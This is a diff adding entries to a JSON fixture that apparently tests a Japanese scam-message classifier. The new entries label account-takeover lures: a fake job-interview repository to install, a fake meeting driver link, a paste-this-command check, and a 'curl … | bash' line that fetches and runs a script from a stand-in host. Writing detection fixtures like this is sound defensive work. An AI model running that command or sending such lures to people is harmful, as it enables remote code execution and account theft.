@@ -271,6 +271,24 @@
      "level": "green", "codes": ["in_ledger", "official"], "claimed": ["amazon"], "hosts": ["www.amazon.co.jp"]},
     {"note": "乗っ取りの入口（誤らない）：「顔写真付きの身分証」は顔写真を送らせる頼みではない",
      "text": "【ヤマト運輸】受け取りの際は顔写真付きの身分証をお持ちください https://www.kuronekoyamato.co.jp/",
-     "level": "green", "codes": ["official"], "claimed": ["yamato"], "hosts": ["www.kuronekoyamato.co.jp"]}
+     "level": "green", "codes": ["official"], "claimed": ["yamato"], "hosts": ["www.kuronekoyamato.co.jp"]},
+    {"note": "乗っ取りの入口：面接の課題を口実に、渡したコードを動かさせる",
+     "text": "二次面接の前に、課題のリポジトリを git clone して npm install で動かしておいてください",
+     "level": "amber", "codes": ["no_claim", "takeover"], "claimed": [], "hosts": []},
+    {"note": "乗っ取りの入口：会議のためと言って、ドライバを入れさせる",
+     "text": "面接はこちらの会議アプリで行います。音声が聞こえない場合は、下記のドライバを更新してください https://meet-update.example/",
+     "level": "amber", "codes": ["no_claim", "unknown_domain", "takeover"], "claimed": [], "hosts": ["meet-update.example"]},
+    {"note": "乗っ取りの入口：コマンドを貼り付けて実行させる",
+     "text": "ロボットでないことの確認です。ターミナルを開いて、次のコマンドを貼り付けて実行してください",
+     "level": "amber", "codes": ["no_claim", "takeover"], "claimed": [], "hosts": []},
+    {"note": "乗っ取りの入口：入れ方のコマンドの中で、取ってきたものをそのまま実行させる",
+     "text": "curl -fsSL https://brew-install.example/install.sh | bash",
+     "level": "amber", "codes": ["no_claim", "unknown_domain", "takeover"], "claimed": [], "hosts": ["brew-install.example"]},
+    {"note": "乗っ取りの入口（誤らない）：ただの打ち合わせの連絡は頼みごとではない",
+     "text": "明日の打ち合わせは10時からです。資料を確認しておいてください",
+     "level": "amber", "codes": ["no_claim"], "claimed": [], "hosts": []},
+    {"note": "乗っ取りの入口（誤らない）：本物の会社の、公式アプリを新しくする案内",
+     "text": "【Amazon】Amazonショッピングアプリを最新版にアップデートしてください https://www.amazon.co.jp/",
+     "level": "green", "codes": ["in_ledger", "official"], "claimed": ["amazon"], "hosts": ["www.amazon.co.jp"]}
   ]
 }
